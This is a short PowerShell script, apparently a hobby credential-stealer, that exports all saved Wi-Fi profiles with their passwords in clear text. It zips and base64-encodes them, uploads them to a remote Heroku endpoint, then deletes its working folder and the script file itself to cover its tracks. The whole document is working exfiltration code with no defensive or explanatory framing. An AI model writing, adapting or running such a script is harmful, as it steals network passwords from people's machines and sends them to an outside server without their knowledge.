
# ! idea belongs to https://www.youtube.com/watch?v=QHwPaLChvgw
# ! created by https://github.com/alex-146

$ENV = "PRODUCTION"

$temp_folder = "temp"
$file_name = "profiles.zip"
$file_path = ".\$temp_folder\$file_name"

$APP_HOST = if ($ENV -eq "DEBUG") { "http://127.0.0.1:5000" } else { "https://node-deploy-alex.herokuapp.com" }
$UPLOAD_URL = "$APP_HOST/upload"

if (!(Test-Path $temp_folder)) {
  New-Item -ItemType Directory -Path $temp_folder
}

netsh wlan export profile folder=$temp_folder key=clear
Compress-Archive -U -Path "$temp_folder\*.xml" -DestinationPath $file_path

$guid = [guid]::NewGuid().ToString()

$body = @{
  "filename"="$guid.zip"
  "encoding"="base64"
  "content"=[convert]::ToBase64String((Get-Content $file_path -Encoding byte))
} | ConvertTo-Json

$response = Invoke-WebRequest -Uri $UPLOAD_URL -Method Post -Body $body -ContentType "application/json"

Remove-Item $temp_folder -Recurse

$file_path = $MyInvocation.MyCommand.Path

Remove-Item $file_path
